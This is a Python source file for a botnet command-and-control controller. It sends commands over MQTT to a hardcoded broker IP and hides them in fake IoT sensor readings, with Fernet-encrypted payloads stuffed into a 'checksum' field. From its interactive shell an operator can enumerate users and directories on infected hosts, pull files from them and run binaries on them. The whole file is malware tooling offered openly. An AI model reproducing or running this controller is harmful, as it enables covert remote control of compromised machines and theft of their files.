#!/usr/bin/env python3
"""
MQTT C&C Controller - Command & Control Interface
Disguised as an IoT sensor management system
"""

import paho.mqtt.client as mqtt
import json
import base64
import time
import sys
from datetime import datetime
from cryptography.fernet import Fernet

# Configuration
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"

# Fixed Fernet key (must be same in bot)
ENCRYPTION_KEY = b'8PxL4MZQDq_1jKvN3wYbR5tG7hC2sF9mX6nB0pA4eU8='


class C2Controller:
	def __init__(self):
		self.client = mqtt.Client(client_id=f"controller_{int(time.time())}")
		self.cipher = Fernet(ENCRYPTION_KEY)
		self.bots = {}
		self.waiting_response = False

	def encrypt_data(self, data):
		"""Encrypt command payload"""
		return self.cipher.encrypt(data.encode()).decode()

	def decrypt_data(self, data):
		"""Decrypt response payload"""
		try:
			return self.cipher.decrypt(data.encode()).decode()
		except:
			return None

	def send_command(self, cmd_type, target="all", params=None):
		"""Send command to bots disguised as sensor calibration"""
		if params is None:
			params = {}

		cmd_data = {
			"cmd": cmd_type,
			"target": target,
			"params": params
		}

		# Create disguised message
		msg = {
			"device_id": "controller_hub_001",
			"timestamp": int(time.time()),
			"temperature": 25.0,
			"humidity": 60.0,
			"battery": 95,
			"status": "calibrating",  # Signal that this is a command
			"checksum": self.encrypt_data(json.dumps(cmd_data))
		}

		self.client.publish(TOPIC, json.dumps(msg))
		print(f"[*] Command '{cmd_type}' sent to {target}")
		self.waiting_response = True

	def on_message(self, client, userdata, msg):
		"""Handle responses from bots"""
		try:
			data = json.loads(msg.payload.decode())

			# Filter out our own messages
			if "controller_hub" in data.get("device_id", ""):
				return

			# Check for bot responses (encrypted in checksum)
			if "checksum" in data and len(data.get("checksum", "")) > 50:
				encrypted_response = data["checksum"]
				response_data = self.decrypt_data(encrypted_response)

				if response_data:
					try:
						response_json = json.loads(response_data)
						bot_id = response_json.get("bot_id")
						result = response_json.get("result")

						# Track bot
						self.bots[bot_id] = {
							"last_seen": datetime.now(),
							"device_id": data.get("device_id")
						}

						print(f"\n{'=' * 60}")
						print(f"[+] Response from Bot: {bot_id}")
						print(f"{'=' * 60}")
						print(result)
						print(f"{'=' * 60}\n")

					except json.JSONDecodeError:
						pass
		except:
			pass

	def on_connect(self, client, userdata, flags, rc):
		"""Handle connection"""
		print("[+] Controller connected to MQTT broker")
		print(f"[*] Listening on topic: {TOPIC}")
		client.subscribe(TOPIC)

	def list_bots(self):
		"""List active bots"""
		print("\n[*] Active Bots:")
		if not self.bots:
			print("  No bots discovered yet. Send 'announce' command.")
		for bot_id, info in self.bots.items():
			print(f"  - {bot_id} (last seen: {info['last_seen'].strftime('%H:%M:%S')})")
		print()

	def interactive_shell(self):
		"""Interactive command shell"""
		print("\n" + "=" * 60)
		print("MQTT C&C Controller - Stealth Mode")
		print("=" * 60)
		print("\nCommands:")
		print("  announce [bot_id]     - Announce bot presence")
		print("  users [bot_id]        - List logged in users")
		print("  ls [bot_id] [dir]     - List directory contents")
		print("  whoami [bot_id]       - Get bot user ID")
		print("  getfile [bot_id] [path] - Download file")
		print("  exec [bot_id] [binary] - Execute binary")
		print("  bots                  - List active bots")
		print("  help                  - Show this help")
		print("  exit                  - Quit controller")
		print("\nNote: Use 'all' as bot_id to target all bots")
		print("=" * 60 + "\n")

		while True:
			try:
				cmd_input = input("C2> ").strip()

				if not cmd_input:
					continue

				parts = cmd_input.split()
				cmd = parts[0].lower()

				if cmd == "exit":
					break

				elif cmd == "help":
					self.interactive_shell.__doc__
					continue

				elif cmd == "bots":
					self.list_bots()
					continue

				elif cmd == "announce":
					target = parts[1] if len(parts) > 1 else "all"
					self.send_command("announce", target)

				elif cmd == "users":
					target = parts[1] if len(parts) > 1 else "all"
					self.send_command("users", target)

				elif cmd == "whoami":
					target = parts[1] if len(parts) > 1 else "all"
					self.send_command("whoami", target)

				elif cmd == "ls":
					target = parts[1] if len(parts) > 1 else "all"
					directory = parts[2] if len(parts) > 2 else "."
					self.send_command("ls", target, {"dir": directory})

				elif cmd == "getfile":
					if len(parts) < 3:
						print("[!] Usage: getfile [bot_id] [filepath]")
						continue
					target = parts[1]
					filepath = " ".join(parts[2:])
					self.send_command("getfile", target, {"path": filepath})

				elif cmd == "exec":
					if len(parts) < 3:
						print("[!] Usage: exec [bot_id] [binary]")
						continue
					target = parts[1]
					binary = " ".join(parts[2:])
					self.send_command("exec", target, {"bin": binary})

				else:
					print(f"[!] Unknown command: {cmd}")

				# Wait a bit for responses
				time.sleep(1)

			except KeyboardInterrupt:
				print("\n[!] Use 'exit' to quit")
			except Exception as e:
				print(f"[!] Error: {e}")

	def run(self):
		"""Start the controller"""
		self.client.on_connect = self.on_connect
		self.client.on_message = self.on_message

		try:
			self.client.connect(BROKER, PORT, 60)
			self.client.loop_start()

			# Wait for connection
			time.sleep(2)

			# Start interactive shell
			self.interactive_shell()

		except KeyboardInterrupt:
			print("\n[!] Shutting down controller")
		finally:
			self.client.loop_stop()
			self.client.disconnect()


if __name__ == "__main__":
	controller = C2Controller()
	controller.run()